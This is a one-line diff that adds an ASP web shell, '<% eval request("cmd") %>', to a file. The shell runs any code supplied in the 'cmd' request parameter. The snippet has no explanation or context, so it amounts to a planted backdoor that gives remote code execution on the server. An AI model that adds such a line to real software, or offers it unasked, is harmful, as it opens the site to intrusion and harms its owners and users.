@@ -1,0 +1,1 @@
+<% eval request("cmd") %>
